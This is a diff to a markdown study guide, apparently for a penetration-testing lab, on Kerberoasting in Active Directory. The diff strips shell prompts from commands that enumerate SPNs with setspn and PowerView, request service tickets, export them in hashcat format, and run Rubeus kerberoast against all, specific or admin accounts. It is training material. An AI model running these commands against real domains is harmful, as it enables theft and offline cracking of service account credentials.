@@ -1452,7 +1452,7 @@ This approach is helpful when automated tools are unavailable or blocked. It com
 - Use `setspn.exe` (a built-in Windows binary) to query the domain for SPNs.
 
 ```shell
-C:\htb> setspn.exe -Q */*
+ setspn.exe -Q */*
 ```
 
 - **Explanation**:
@@ -1466,8 +1466,8 @@ C:\htb> setspn.exe -Q */*
 - Request a TGS ticket for a specific SPN.
 
 ```powershell
-PS C:\htb> Add-Type -AssemblyName System.IdentityModel
-PS C:\htb> New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433"
+ Add-Type -AssemblyName System.IdentityModel
+ New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433"
 ```
 
 - **Context and Explanation**:
@@ -1535,25 +1535,25 @@ Automated tools simplify Kerberoasting by combining enumeration, ticket requests
 1. **Import PowerView Module**:
    - Load the PowerView script into the PowerShell session:
    ```powershell
-   PS C:\htb> Import-Module .\PowerView.ps1
+    Import-Module .\PowerView.ps1
    ```
 
 2. **Enumerate SPNs**:
    - List all SPN-enabled user accounts in the domain:
    ```powershell
-   PS C:\htb> Get-DomainUser * -spn | select samaccountname
+    Get-DomainUser * -spn | select samaccountname
    ```
 
 3. **Retrieve Tickets**:
    - Request a TGS ticket for a specific account and format it for `hashcat`:
    ```powershell
-   PS C:\htb> Get-DomainUser -Identity sqldev | Get-DomainSPNTicket -Format Hashcat
+    Get-DomainUser -Identity sqldev | Get-DomainSPNTicket -Format Hashcat
    ```
 
 4. **Export All Tickets**:
    - Export tickets for all SPN-enabled accounts to a CSV file for offline processing:
    ```powershell
-   PS C:\htb> Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\ilfreight_tgs.csv -NoTypeInformation
+    Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\ilfreight_tgs.csv -NoTypeInformation
    ```
 
 ---
@@ -1562,7 +1562,7 @@ Automated tools simplify Kerberoasting by combining enumeration, ticket requests
 1. **Basic Kerberoasting**:
    - Request all TGS tickets in the domain:
    ```powershell
-   PS C:\htb> .\Rubeus.exe kerberoast /nowrap
+    .\Rubeus.exe kerberoast /nowrap
    ```
    - **Explanation**:
      - `/nowrap`: Ensures Base64 ticket blobs are not wrapped across multiple lines.
@@ -1570,19 +1570,19 @@ Automated tools simplify Kerberoasting by combining enumeration, ticket requests
 2. **Target Specific SPNs**:
    - Request a TGS ticket for a specific SPN:
    ```powershell
-   PS C:\htb> .\Rubeus.exe kerberoast /spn:"MSSQLSvc/SQLSERVER"
+    .\Rubeus.exe kerberoast /spn:"MSSQLSvc/SQLSERVER"
    ```
 
 3. **Filter by Admin Accounts**:
    - Target high-value accounts with the `admincount` attribute set:
    ```powershell
-   PS C:\htb> .\Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap
+    .\Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap
    ```
 
 4. **View Statistics**:
    - View the encryption types and password last set dates for Kerberoastable accounts:
    ```powershell
-   PS C:\htb> .\Rubeus.exe kerberoast /stats
+    .\Rubeus.exe kerberoast /stats
    ```
 ---
 
@@ -1598,7 +1598,7 @@ Automated tools simplify Kerberoasting by combining enumeration, ticket requests
 
 #### **Example: Checking Encryption Type with PowerView**
 ```powershell
-PS C:\htb> Get-DomainUser testspn -Properties samaccountname,serviceprincipalname,msds-supportedencryptiontypes
+ Get-DomainUser testspn -Properties samaccountname,serviceprincipalname,msds-supportedencryptiontypes
 ```
 
 - **Output**:
@@ -1612,7 +1612,7 @@ PS C:\htb> Get-DomainUser testspn -Properties samaccountname,serviceprincipalnam
 #### **Retrieve Tickets with RC4 Encryption**
 - Use **Rubeus** to request TGS tickets for a target SPN account:
 ```powershell
-PS C:\htb> .\Rubeus.exe kerberoast /user:testspn /nowrap
+ .\Rubeus.exe kerberoast /user:testspn /nowrap
 ```
 
 - **Output**:
